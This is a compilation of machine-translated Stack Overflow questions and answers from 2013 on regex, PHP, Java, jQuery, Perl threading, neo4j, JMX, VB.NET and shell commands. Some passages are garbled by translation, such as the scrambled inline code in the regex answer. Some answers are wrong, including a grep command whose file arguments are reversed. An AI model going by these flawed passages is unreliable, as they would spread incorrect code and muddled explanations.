"aabbhahahahahahahahahahahasetsetset".replace(/[^\w\s]|(.+)\1+/gi, '$1') 
```

结果是：

```
abhahahahahahaset 
```

我想得到结果：

```
abhaset 
```

这该怎么做 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:07:40.627

`.+`是[贪婪](http://www.regular-expressions.info/repeat.html#greedy)的。它需要尽可能多的时间。那是`ha`s 的一半，因此`\1`可以匹配下半部分。使重复不贪婪应该可以解决问题：

```
/[^\w\s]|(.+?)\1+/gi 
```

顺便说一句，`i`这里并没有改变任何东西。

要摆脱嵌套重复（例如转换`aaBBaaBB`为`aB`（通过`aaBB`或`aBaB`）），只需多次运行替换，直到结果不再改变。

```
var pattern = /[^\w\s]|(.+?)\1+/g;

var output = "aaBBaaBB";
var input;

do
{
    input = output;
    output = input.replace(pattern, "$1");
} while (input != output) 
```

我承认`output`第一次重复的命名有点尴尬，但你知道……计算机科学中最困难的两个问题是缓存失效、命名事物和一个错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:09:13.147

`.+`将匹配可能的*最大*数量，因此`hahahaha`满足`(.+)\1`和。你想匹配可能的*最小*数量，所以使用不情愿的量词。`haha``haha`

 *```
"aabbhahahahahahahahahahahasetsetset".replace(/[^\w\s]|(.+?)\1+/gi, '$1') 
```

[http://jsfiddle.net/HQRDg/](http://jsfiddle.net/HQRDg/)*

# php - 将 2 元素数组的数组转换为以 2 元素为键 => 值的数组

> ID：16215479
> 
> 赞同：0
> 
> 时间：2013-04-25T13:02:31.880
> 
> 标签：php, arrays

是否可以使用一些 PHP 内置函数将以下数组转换为包含`id`作为键的值和`label`作为关联值的值的数组？如果没有什么是有效的方法？

谢谢。

输入数组：

```
Array
(
    [0] => Array
        (
            [id] => 2
            [label] => MTD-589
        )

    [1] => Array
        (
            [id] => 3
            [label] => MTD-789
        )

) 
```

输出数组：

```
Array
(
  [2] => MTD-589,
  [3] => MTD-789,
) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:09:21.673

我不知道任何内置函数，但我会这样做：

假设`$originalArray`您要转换的数组

```
$newArray = array();

foreach ($originalArray as $element)
     $newArray[$element["id"]] = $element["label"]; 
```

输出结果

```
var_dump($newArray); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:14:05.860

介绍[array_column](http://benramsey.com/blog/2013/03/introducing-array-column-in-php-5-dot-5/)（仍在 PHP 5.5 Beta 中）。

```
$new_array = array_column($your_array 'label', 'id'); 
```

**输出**：

```
Array
(
  [2] => MTD-589,
  [3] => MTD-789,
) 
```

使用[array_walk](http://php.net/manual/en/function.array-walk.php)。

```
array_walk($array, function($a) use (&$return) { $return[$a['id']] = $a['label']; });
print_r($return); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:08:33.890

如果您可以使一个数组具有您的 ID，而一个数组具有您的标签，则可以使用 array_combine 将两者合并为键/值[http://php.net/manual/en/function.array-combine.php](http://php.net/manual/en/function.array-combine.php)

# java - PrintWriter vs FileWriter 在以下上下文中

> ID：16215484
> 
> 赞同：0
> 
> 时间：2013-04-25T13:02:47.647
> 
> 标签：java, filewriter, printwriter

如果在下一段代码中我将替换`(new FileWriter`为`(new PrintWriter`

```
pw = new PrintWriter(new BufferedWriter(new FileWriter  ("xanaduindeed.txt")));

pw = new PrintWriter(new BufferedWriter(new PrintWriter ("xanaduindeed.txt"))); 
```

它们都工作正常，但是我想知道两者中的哪一个优化了内存使用。（如果两者中的任何一个实际上更好）在此先感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:08:12.013

在 Oracle 的 JVM 中：

```
public PrintWriter(String fileName) throws FileNotFoundException {
    this(new BufferedWriter(new OutputStreamWriter(new FileOutputStream(fileName))),
         false);
} 
```

`PrintWriter`的显着特点是在每个换行符（LF 或 CR 或 CRLF）上刷新输出。最低的内存占用是一个裸露的`FileWriter`，但缓冲可以显着提高 I/O 性能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:08:01.243

我担心的主要事情是两种情况下的异常处理不同。[在这里](https://stackoverflow.com/questions/5759925/printwriter-vs-filewriter-in-java)查看这个较旧的答案

不过，无论哪种情况，都要小心编码！您正在使用系统的默认设置，因此您在计算机上编写的内容可能会在另一台计算机上被误读

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:48:50.090

最好的解决方案是

```
new PrintWriter ("xanaduindeed.txt"))); 
```

它在内部使用 BufferedWriter 并将文本写入字符输出流，缓冲字符以提供单个字符、数组和字符串的高效写入。您无需尝试进一步优化它。

# javascript - 这个javascript下拉选择功能有什么问题？

> ID：16215488
> 
> 赞同：0
> 
> 时间：2013-04-25T13:02:58.330
> 
> 标签：javascript, jquery, select, option

我正在调用一个可重用的函数来设置下拉列表的选定值。我在这里想念什么？

```
function setDropdownValue(dropdownId,selectedValue){
            $(dropdownId 'option').each(function(){
                 if ($(this).val().toLowerCase()==selectedValue.toLowerCase()){
                     //found the option i  was looking for, do what i want
                     $(this).val(selectedValue);
                 }
            });
        } 
```

我这样称呼它，

```
function setSelectedSport(selSport,tempCount){

        setDropdownValue($("#sportId2"),selSport);
    } 
```

我在`$(dropdownId 'option').each(function(){`..中收到未定义的错误。我在这里遗漏了什么吗？

**编辑：**

将其更改为`$('#'+dropdownId+' option').each(function(){`ecah() 函数后似乎没有执行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:04:02.613

看起来您缺少连接运算符和 ID 的哈希标记。尝试：

```
$('#'+dropdownId+' option') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:04:25.840

尝试改变：

```
$(dropdownId 'option').each(function(){ 
```

到：

```
$('#' + dropdownId + ' option').each(function(){ 
```

以及使用[prop()](http://api.jquery.com/prop/)来获取您的 id：

```
setDropdownValue($("#sportId2").prop('id'),selSport); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:05:36.647

您可以只使用该`.val()`方法来选择值。

```
$("#sportId2").val(selSport); 
```

因此，如果您需要该功能，则该功能可以是：

```
function setDropdownValue(dropdownId,selectedValue) {
  $('#'+dropdownId).val(selectedValue);
} 
```

并像这样使用它：`setDropdownValue("sportId2",selSport);`

# security - HTTPS 下载/上传

> ID：16215490
> 
> 赞同：0
> 
> 时间：2013-04-25T13:03:00.840
> 
> 标签：security, ssl, https, upload, download

我的网站可通过 https 访问，因此它为必须填写一些合理详细信息的用户提供了安全连接。

安全性是否也扩展到通过网站完成的下载和上传？例如。我提供了一个简单的“浏览”按钮来上传文件，或者提供一个链接来下载网站上托管的文件，下载/上传是否也安全？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:13:50.470

**让我先解释一些事情。**

SSL 只是一个层或一个连接。发送/接收到您网站的任何数据都在数据包中并成功加密，而这有望防止“中间人攻击”。[好消息..对? :-)]

但是..根据您的要求**，在上传/下载方面，No SSL 不能确保安全。**

您需要**将例外添加到您让其他（最终用户）上传到您的服务器的文件类型 [MIME]** [这里，SSL 在这里没有工作]。**您必须在您的编码部分设置这些限制**。如果这些事情处理不当，黑客可能会在您的上传部分上传一个 SHELL 脚本，并且可以获得对您服务器的 root 访问权限，您不能将此归咎于 SSL。

# multithreading - How do I queue perl subroutines to a thread queue instead of data?

> ID：16215502
> 
> 赞同：4
> 
> 时间：2013-04-25T13:03:36.587
> 
> 标签：multithreading, perl, queue

**Background**:
In reading how to multithread my perl script, I read (*from [http://perldoc.perl.org/threads.html#BUGS-AND-LIMITATIONS](http://perldoc.perl.org/threads.html#BUGS-AND-LIMITATIONS)*)

> On most systems, frequent and continual creation and destruction of threads can lead to ever-increasing growth in the memory footprint of the Perl interpreter. While it is simple to just launch threads and then ->join() or ->detach() them, for long-lived applications, it is better to maintain a pool of threads, and to reuse them for the work needed, using queues to notify threads of pending work.

My script will be long-lived; it's an PKI LDAP directory monitoring daemon that will always be running. The enterprise monitoring solution will generate an alarm if it stops running for any reason. My script will check that I can reach another PKI LDAP directory, as well as validate revocation lists on both.

**Problem**: Everything I can find on google shows passing variables (e.g. scalars) to the thread queue rather than the subroutine itself... I think I'm just not understanding how to implement a thread queue properly compared to how you implement a thread (without queues).

**Question 1**: How can I "maintain a pool of threads" to avoid the perl interpreter from slowly eating up more and more memory?
**Question 2**: (Unrelated but while I have this code posted) Is there a safe amount of sleep at the end of the main program so that I don't start a thread more than once in a minute? 60 seems obvious but could that ever cause it to run more than once if the loop is fast, or perhaps miss a minute because of processing time or something?

Thanks in advance!

```
#!/usr/bin/perl

use feature ":5.10";
use warnings;
use strict;
use threads;
use Proc::Daemon;
#

### Global Variables
use constant false => 0;
use constant true  => 1;
my $app = $0;
my $continue = true;
$SIG{TERM} = sub { $continue = false };

# Directory Server Agent (DSA) info
my @ListOfDSAs = (
    { name => "Myself (inbound)",
      host => "ldap.myco.ca",
      base => "ou=mydir,o=myco,c=ca",
    },
    { name => "Company 2",
      host => "ldap.comp2.ca",
      base => "ou=their-dir,o=comp2,c=ca",
    }
);    
#

### Subroutines

sub checkConnections
{   # runs every 5 minutes
    my (@DSAs, $logfile) = @_;
    # Code to ldapsearch
    threads->detach();
}

sub validateRevocationLists
{   # runs every hour on minute xx:55
    my (@DSAs, $logfile) = @_;
    # Code to validate CRLs haven't expired, etc
    threads->detach();
}

#

### Main program
Proc::Daemon::Init;

while ($continue)
{
    my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);

    # Question 1: Queues??

    if ($min % 5 == 0 || $min == 0)
        { threads->create(&checkConnections, @ListOfDSAs, "/var/connect.log"); }

    if ($min % 55 == 0)
        { threads->create(&validateRevocationLists, @ListOfDSAs, "/var/RLs.log"); }

    sleep 60; # Question 2: Safer/better way to prevent multiple threads being started for same check in one matching minute?
}

# TERM RECEIVED
exit 0;
__END__ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T14:31:34.490

```
use threads;
use Thread::Queue 3.01 qw( );

my $check_conn_q      = Thread::Queue->new();
my $validate_revoke_q = Thread::Queue->new();

my @threads;
push @threads, async {
   while (my $job = $check_conn_q->dequeue()) {
      check_conn(@$job);
   }
};
push @threads, async {
   while (my $job = $validate_revoke_q->dequeue()) {
      validate_revoke(@$job);
   }
};

while ($continue) {
   my ($S,$M,$H,$m,$d,$Y) = localtime; $m+=1; $Y+=1900;

   $check_conn_q->enqueue([ @ListOfDSAs, "/var/connect.log" ])
      if $M % 5 == 0;

   $validate_revoke_q->enqueue([ @ListOfDSAs, "/var/RLs.log" ])
      if $M == 55;

   sleep 30;
}

$check_conn_q->end();
$validate_revoke_q->end();
$_->join for @threads; 
```

* * *

我不确定这里是否需要并行化。如果不是，您可以简单地使用

```
use List::Util qw( min );

sub sleep_until {
   my ($until) = @_;
   my $time = time;
   return if $time >= $until;
   sleep($until - $time);
}

my $next_check_conn = my $next_validate_revoke = time;
while ($continue) {
   sleep_until min $next_check_conn, $next_validate_revoke;
   last if !$continue;

   my $time = time;
   if ($time >= $next_check_conn) {
      check_conn(@ListOfDSAs, "/var/connect.log");
      $next_check_conn = time + 5*60;
   }

   if ($time >= $next_validate_revoke) {
      validate_revoke(@ListOfDSAs, "/var/RLs.log");
      $next_validate_revoke = time + 60*60;
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T14:31:00.730

我建议一次只运行一个检查，因为在这里使用线程似乎没有令人信服的理由，而且您不想为将一直运行的程序增加不必要的复杂性。

如果您确实想了解如何使用线程池，[模块中](http://cpansearch.perl.org/src/JDHEDDEN/threads-1.86/examples/)[包含一些示例`threads`](http://cpansearch.perl.org/src/JDHEDDEN/threads-1.86/examples/)。还有一个可能有用的[`Thread::Pool`模块。](http://search.cpan.org/~elizabeth/Thread-Pool-0.33/lib/Thread/Pool.pm)

至于确保您不在同一分钟内重复检查，您是正确的，`sleeping`60 秒是不够的。无论您选择睡眠的值是什么，您都会遇到它失败的边缘情况：或者它会略短于一分钟，并且您偶尔会在同一分钟内进行两次检查，或者它会略长于一分钟，你偶尔会完全错过一张支票。

相反，使用变量来记住上次完成任务的时间。然后，您可以使用更短的睡眠时间，而不必担心每分钟进行多次检查。

```
my $last_task_time = -1;
while ($continue)
{
    my $min = (localtime(time))[1];

    if ($last_task_time != $min && 
          ($min % 5 == 0 || $min > ($last_task_time+5)%60))
    { 
        #Check connections here.

        if ($min == 55 || ($last_task_time < 55 && $min > 55))
        { 
           #Validate revocation lists here.
        }

        $last_task_time = $min;
    }
    else
    {
        sleep 55; #Ensures there is at least one check per minute.
    }
} 
```

**更新：**我修复了代码，以便在最后一个任务运行时间过长时恢复。如果偶尔需要很长时间，这会很好。但是，如果任务经常花费超过五分钟的时间，您需要一个不同的解决方案（在这种情况下线程可能是有意义的）。

# html - 带有css3的内弧形盒子，这可能吗？

> ID：16215503
> 
> 赞同：1
> 
> 时间：2013-04-25T13:03:42.163
> 
> 标签：html, css

我想知道这是否可以在 css3 中进行，或者需要使用 .png 来完成？

如果可以制作一个内圆，那么也许只需添加宽度，例如 400%，你就会得到这个圆的轻微曲线？谢谢 ！！！！

截屏：

[http://oi34.tinypic.com/xya89.jpg](http://oi34.tinypic.com/xya89.jpg)

# c# - Maximum size of DataTable or other complex object in .NET

> ID：16215504
> 
> 赞同：1
> 
> 时间：2013-04-25T13:03:42.353
> 
> 标签：c#, memory

I know, that size of object is limited to 2GB in .NET,

but what about maximum size of more complex objects, like DataTable?

It depends on low-level objects inside?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:05:53.763

更复杂的对象仍然是内部的对象，它们包含对其他对象的引用。例如，如果是这样，`DataTable`则它包含对每一行的引用等。对于操作系统类型，每个指针将占用 32 位或 64 位。只有指针大小是总和，对象图深度没有限制（合理）。在这种情况下，您唯一的限制是可以为进程本身分配的最大内存量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:08:28.137

关于行，DataTable 可以存储的最大行数是 16,777,216。

# iphone - UIWebView：删除指定webview的cookies

> ID：16215509
> 
> 赞同：1
> 
> 时间：2013-04-25T13:03:58.597
> 
> 标签：iphone, cookies, ios6, uiwebview

我有两个网络视图，我希望两个在这两个网络视图上运行两个不同的 Facebook 帐户。但是，如果我在一个 webview 上登录，另一个 webview 会自动登录，并且这两个 webview 共享相同的 cookie。我知道我可以通过使用删除所有 cookie 的代码来删除 cookie。但是，这会删除两个 web 视图的 cookie。那么有没有办法只删除一个 webview 的 cookie？或者也许是另一种实现这一目标的方法？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:05:14.493

这将不起作用，因为两者`UIWebView`将共享相同的 cookie。

`UIWebView`cookie 和缓存与应用程序共享，每个应用程序都有自己的 cookie 和缓存存储在应用程序沙箱中。没有办法改变它的行为。

# c# - 脚本中的无限对象声明

> ID：16215519
> 
> 赞同：-6
> 
> 时间：2013-04-25T13:04:16.490
> 
> 标签：c#, unity3d

我在 Unity 中有一个脚本，用于在我的赛车游戏中保存检查点。但我不知道赛道上有多少检查站。现在我仅限于 5 个：

![在此处输入图像描述](https://i.stack.imgur.com/Ebwfs.png)

但是，我想允许地图制作者插入更多的检查点。这不起作用：

```
public List<GameObject> checkPoints = new List<GameObject>(); 
```

那么最好的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T15:10:14.887

定义检查点数组不起作用吗？

`public GameObject[] CheckPoints;`

我目前无法访问 Unity，但这应该允许您通过检查器将任何（合理）数量的 GameObjects 输入到 CheckPoints 数组中。

Unity Answers 上的这与此问题类似： http: [//answers.unity3d.com/questions/245024/public-array-of-gameobjects.html](http://answers.unity3d.com/questions/245024/public-array-of-gameobjects.html)

在这里胡乱猜测，是你的错误`List1' could not be found`吗？在这种情况下，您必须添加`using System.Collections.Generic;`才能使用 C# 列表。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-25T14:38:15.677

This: `public List<GameObject> checkPoints = new List<GameObject>();` doesn't show up because it's a list of GameObjects, not a list of Vectors. Users can't manually type in GameObjects. You could do: `public List<Vector3> checkPoints = new List<Vector3>();` and then simply iterate through this list and do a Resource.Load for each position at runtime (if you can't figure this out, I could type up an example).

A more user friendly solution would be to allow users to add checkpoints by placing a GameObject in the world, rather than having to type each vector manually. So for instance, create a CheckPoint object, and give it a unique tag (eg: "CheckPointTag"), then simply run the method bellow to get all the checkpoint positions:

```
public List<Vector3> GetCheckPoints()
{
     GameObject[] objects = GameObject.FindGameObjectsWithTag("CheckPointTag");
     List<Vector3> objectPos = new List<Vector3>();
     foreach(GameObject object in objects)
          objectPos.Add(object.transform.Position;

     return objectPos;
} 
```

# jquery - jqGrid 单元格为分钟/秒并递增

> ID：16215520
> 
> 赞同：0
> 
> 时间：2013-04-25T13:04:18.010
> 
> 标签：jquery, jqgrid

找不到我所拥有的任何例子，所以也许你可以帮助我。

我有一个查询 sql 表的更新时间的网格。结果来自`int`a `DATEDIFF`。我想在 jqgrid 单元格中实现的是：显示自表更新以来的分钟/秒数（假设我拥有的 int），并让它随着秒数的流逝而增加。

例如，一旦网格刷新该特定单元格将是 8。我希望它随着秒数的流逝而不断增加。20 秒后，我希望它是 28，依此类推。所需的最终结果将包括一些演员表和串联，因此我可以显示 25:12+。

你知道有什么方法可以像这样编辑 jqgrid 单元格吗？提前致谢。

**编辑**

数据库表。

```
Name              Update

UsersTable        SomedatetimeValue
AddressesTable    SomedatetimeValue 
```

等等

我想展示的 jqGrid 类似于

```
UsersTable      8:10    
AddressesTable  6:35 
```

那些 8:10 和 6:35 是我想要随着秒数过去而增加的值。因此，当用户看到网格时，他就知道自上次更新这些特定表以来已经过了多长时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:30:15.780

这是我的做法：

按照您的描述从您的控制器传递值。

通过以下方式向显示时间的列添加一个类：

```
classes: 'LastUpdateTimeClass' 
```

在加载 jqGrid 时，设置一个计时器函数来更新每个具有该类的值。例如（在 jqGrid 设置内部）

```
loadComplete: function () {
    if (timer) {window.clearinterval(timer)}; //clear the timer

    //setup the timer
    self.setInterval(function () {
      $('.LastUpdateTimeClass').each(function () {                              
          $(this).text(parseInt($(this).text(), 10) + 1); 
      });
    }, 1000);
}//loadComplete 
```

# c# - IIS server won't load web application

> ID：16215522
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:04:19.573
> 
> 标签：c#, .net, iis

I have a web application in my iis and i locate in :

```
C:\inetpub\wwwroot\blabla\Test\Web.aspx 
```

And i have a domain , that i browse to the web page with this:

```
www.mydomain.com/Test/web.aspx 
```

And i want to be able to connect the page without the domain too:

```
http://123.123.8.78/blabla/Test/Web.aspx 
```

When i browse with the domain i get the page but when i try with the IP address i get:

```
Server Error in '/' Application.
Parser Error
Description: An error occurred during the parsing of a resource required to service this request. Please review the following specific parse error details and modify your source file appropriately.

Parser Error Message: Could not load type 'App.Web'.

Source Error:

Line 1:  <%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Web.aspx.cs" Inherits="App.Web" %>

Source File: /blabla/test/web.aspx    Line: 1 
```

Any idea why i can't get the page?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:18:59.983

blabla 是网站指向的目录，这就是 /Test/web.aspx 起作用的原因。您需要在默认网站上安装一个指向 blabla 的虚拟目录，以便第二个 URL 请求能够正常工作。仅在 URL 中指定站点名称是行不通的。

默认网站选择目录 /blabla/Test/Web.aspx，但它用于动态编译的 bin 目录是默认网站的主目录，而不是 www.mydomain.com 站点。

# neo4j - neo4j - how to match only first n relations

> ID：16215523
> 
> 赞同：6
> 
> 时间：2013-04-25T13:04:24.087
> 
> 标签：neo4j, cypher

is there a default way how to match only first n relationships except that filtering on `LIMIT n` later?

i have this query:

```
START n=node({id})
MATCH n--u--n2
RETURN u, count(*) as cnt order by cnt desc limit 10; 
```

but assuming the number of `n--u` relationships is very high, i want to relax this query and took for example first 100 random relationships and than continue with `u--n2...`

this is for a collaborative filtering task, and assuming the users are more-less similar i dont want to match all users `u` but a random subset. this approach should be faster in performance - now i got ~500ms query time but would like to drop it under 50ms.

i know i could break the above query into 2 separate ones, but still in the first query it goes through all users and than later it limits the output. i want to limit the max rels during `match` phase.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T19:18:01.477

您可以使用 管道查询当前结果`WITH`，然后使用`LIMIT`这些初始结果，然后在同一查询中继续：

```
START n=node({id})
MATCH n--u
WITH u
LIMIT 10
MATCH u--n2
RETURN u, count(*) as cnt 
ORDER BY cnt desc 
LIMIT 10; 
```

上面的查询会给你`u`找到的前 10 个，然后继续寻找前 10 个匹配`n2`的。

或者，您可以省略第二个`LIMIT`，您将获得前十个的**所有**匹配s （这意味着如果它们与前 10 个匹配，您可能会返回十多个行）。`n2``u``u`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-30T18:41:29.557

这不是您问题的直接解决方案，但由于我遇到了类似的问题，我的解决方法可能对您来说很有趣。

我需要做的是：通过索引获取关系（可能会产生数千个）并获取这些关系的起始节点。由于起始节点始终与该索引查询相同，因此我只需要第一个关系的起始节点。

由于我无法使用 cypher 实现这一点（由 ean5533 提出的查询并没有更好的性能），我正在使用一个简单的[非托管扩展](http://docs.neo4j.org/chunked/stable/server-unmanaged-extensions.html)（[不错的模板](https://github.com/dmontag/neo4j-unmanaged-extension-template)）。

```
@GET
@Path("/address/{address}")
public Response getUniqueIDofSenderAddress(@PathParam("address") String addr, @Context GraphDatabaseService graphDB) throws IOException
{
    try {
        RelationshipIndex index = graphDB.index().forRelationships("transactions");
        IndexHits<Relationship> rels = index.get("sender_address", addr);

        int unique_id = -1;
        for (Relationship rel : rels) {
            Node sender = rel.getStartNode();
            unique_id = (Integer) sender.getProperty("unique_id");
            rels.close();
            break;
        }

        return Response.ok().entity("Unique ID: " + unique_id).build();
    } catch (Exception e) {
        return Response.serverError().entity("Could not get unique ID.").build();
    }
} 
```

对于这里的这种情况，加速非常好。

我不知道您的确切用例，但由于 Neo4j 甚至支持 HTTP 流式传输 afaik，您应该能够创建以将您的查询转换为非托管扩展并仍然获得完整的性能。例如，“java 查询”所有符合条件的节点并将部分结果发送到 HTTP 流。

# java - JMXBean entries are not showing up

> ID：16215527
> 
> 赞同：1
> 
> 时间：2013-04-25T13:04:36.823
> 
> 标签：java, performance, jmx

**Implementation of JMXBean**

```
PerformanceMetadata jmxBean = new PerformanceMetadata();                        
responseDocument = (Document) serviceOperation.invoke(serviceComponent,RequestDocument);
jmxBean.setNumOfRequests(1); 
```

**JMXBean class:**

```
public class PerformanceMetadata implements PerformanceMetadataMBean{
    private int numOfRequests;
        public int getNumOfRequests() {
        return numOfRequests;
    }

    public void setNumOfRequests(int numOfRequests) {
        this.numOfRequests = numOfRequests;
    } 
```

**Class Registering the JMXBean**: I call this class while booting up the server.

```
public class JMXBeans {
    public void registerJMXBeans() 
    {
        MBeanServer mbs = null;
        PerformanceMetadata metadataObj = null;
        ObjectName name;
        try 
        {
            metadataObj = new PerformanceMetadata();
            mbs = ManagementFactory.getPlatformMBeanServer();
            name = new ObjectName("test.performace:type=PerformanceMetadataMBean");
            mbs.registerMBean(metadataObj, name);
        } 
```

But I don't see any value for JMXBean.NumberOfRequests

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:17:15.323

这里的问题是正在注册的 bean 的实例与您设置值的实例不同。因此，您需要协调传递已注册的同一实例（可选地实现为单例），或者您可以简单地使用 JMX 操作更新 MBean。还可以通过创建代理调用程序来简化执行 JMX 操作的复杂性。我建议这种方法：

*   **将NumOfRequests**字段更改为[AtomicInteger](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/atomic/AtomicInteger.html)，因为您希望 MBean 是线程安全的[er]。IE。

*   您的 MBean 和接口应该有一个属性访问器（一个 getter）和一个增量器。

**界面**

```
public int getNumOfRequests();
public void incrementNumOfRequests(int requests); 
```

**执行**

```
private final AtomicInteger numOfRequests = new AtomicInteger(0);
public int getNumOfRequests() {
    return numOfRequests.get();
}
public void incrementNumOfRequests(int requests) {
   numOfRequests.addAndGet(requests);
} 
```

现在您可以注册一次 bean 实例，并通过您可以即时生成的 JMX 代理对其进行更新。这是使用[MBeanServerInvocationHandler](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/MBeanServerInvocationHandler.html)完成的。

```
PerformanceMetadataMBean proxy = (PerformanceMetadataMBean)MBeanServerInvocationHandler.newProxyInstance(ManagementFactory.getPlatformMBeanServer(),
                                                   new ObjectName("test.performace:type=PerformanceMetadataMBean"),
                                                   PerformanceMetadataMBean.class,
                                                   false); 
```

现在，当您调用 时 `proxy.incrementNumOfRequests(14)`，它实际上是在调用 bean 的**incrementNumOfRequests**操作。

试一试。

# fonts - windows phone 8如何更改字体？

> ID：16215535
> 
> 赞同：3
> 
> 时间：2013-04-25T13:04:45.633
> 
> 标签：fonts, windows-phone-8, windows-phone-8-emulator

我在设计时将“ **Lucida Handwriting** ”用于一个文本块控件。

但我在模拟器上运行它需要像这样的字体

**在设计时**

![在此处输入图像描述](https://i.stack.imgur.com/LjmXO.png)

**在模拟器上运行**

![在此处输入图像描述](https://i.stack.imgur.com/YqI8O.png)

怎么可能。我该如何解决这种差异。请帮我。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:06:51.997

您是否在应用程序包中包含字体文件？

1) 将您希望使用的字体文件添加到项目中，并将 Build Action 设置为 Embedded Resource。还要确保将文件复制到“复制到输出目录”属性中的程序集。2）选择您的文本块，然后在属性中下拉字体选择下拉菜单。

您应该在那里看到您的字体，它将被编译到程序集中并可以在应用程序中使用。

# vb.net - How to use 2 connection objects while importing data from one database to another in vb.net

> ID：16215536
> 
> 赞同：0
> 
> 时间：2013-04-25T13:04:45.870
> 
> 标签：vb.net, ms-access-2007

I am using the following code to select from one database and need to insert into another database.. Please suggest me the code:

Code :

```
'Connection for Original database from where i have to import

Dim constrOrg As String = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + strPath
Dim conn_OrgDB As New OleDb.OleDbConnection(constrOrg)

'Connection for my database to where i have to import

Dim App_Path = System.AppDomain.CurrentDomain.BaseDirectory()
Dim constr As String = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + App_Path + "Mydb.accdb"

Dim cnnOLEDB As New OleDb.OleDbConnection(constr)

    Dim strSelInv_one As String = ("SELECT * FROM INV_ONE where (DOCU_DT>=@stdt AND DOCU<=@enddt) ")
    Dim comm_inv_one As OleDb.OleDbCommand = New OleDb.OleDbCommand(strSelInv_one, conn_OrgDB )

    comm_inv_one.Parameters.AddWithValue("@stdt", StTime)
    comm_inv_one.Parameters.AddWithValue("@enddt", Endtime)

    dr = comm_inv_one.ExecuteReader

    Do While dr.Read = True

    Dim strInsInv1 As String = "INSERT INTO INVOICE_ONE(CODE_NO,LAY,..) SELECT CODE_NO,LAY,... FROM INV_ONE where (CODE_NO=@code)"
        Dim comm_Insinv1 As OleDb.OleDbCommand = New OleDb.OleDbCommand(strInsInv1, cnnOLEDB)

        comm_Insinv1.Parameters.AddWithValue("@code", Code_no)
       comm_Insinv1.ExecuteNonQuery()

      Loop

       'Here INVOICE_ONE table belongs cnnOLEDB connection obj of one database and INV_ONE table belongs to conn_OrgDB  connection object of another database..

    ' How to use the 2 connection object ? If i use only one connection object i.e. cnnOLEDB it gives the following Error:

    " The Microsoft Office Access database engine cannot find the input table or query 'INV_ONE'.  Make sure it exists and that its name is spelled correctly.     " 
```

Please suggest me the code.. Thank you

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:29:12.673

试试这段代码，显然不要像他的那样长（基本上把你不需要的东西扔掉并输入你的代码，现在......

此外 ：

```
Dim connectionStr = Constants.Input.MDB.CONNECTION_STRING & _
    "Data Source=" & dbFullPath & ";"
Dim connection As New System.Data.OleDb.OleDbConnection(connectionStr) 
```

另外使用

```
Dim connectionStr2 = "Other conection string"
Dim connection2 As New System.Data.OleDb.OleDbConnection(connectionStr) 
```

并将其导入到他的代码中。

链接： [使用 vb.net 在 MS Access 中选择数据非常慢。我做对了吗？](https://stackoverflow.com/questions/14489815/selecting-data-in-ms-access-with-vb-net-is-very-slow-am-i-doing-it-right)

如果这没有帮助，我很抱歉，因为我没有访问数据库，我无法进一步测试。警戒。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T14:21:13.033

我的建议是使用 Access 在目标数据库中创建指向源（生产）数据库中相应表的链接表。然后，您至少可以使用相同的连接操作两组表，从而使您可以选择执行

```
INSERT INTO INVOICE_1 (codeno, lchlndt, ...)
SELECT codeno, lchlndt, ... FROM INV_ONE ... 
```

# linux - Output line from file1 if not found in file2

> ID：16215542
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:08.760
> 
> 标签：linux, command-line, text-files

I need to output the lines from file1 that are not found in file2, ideally using linux commandline.

Both files are uppercase A-Z, sorted, per-file unique, and contain only one word per line. Typically, file1 is between 5 and 100 lines long, file2 is 250,000 lines long. Processing speed is not an issue.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:14:34.357

```
grep -vhFxf file1 file2 
```

效果很好。

# javascript - 检查 JS 文档的工具

> ID：16215543
> 
> 赞同：0
> 
> 时间：2013-04-25T13:05:10.090
> 
> 标签：javascript, jsdoc, gruntjs

是否有任何工具或脚本可以检查您的 JS 代码并将其与生成的文档进行比较。检查是否指定了任何参数或返回值类型不正确？

我已经使用 grunt 生成了我的 JS 文档。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-27T13:24:15.307

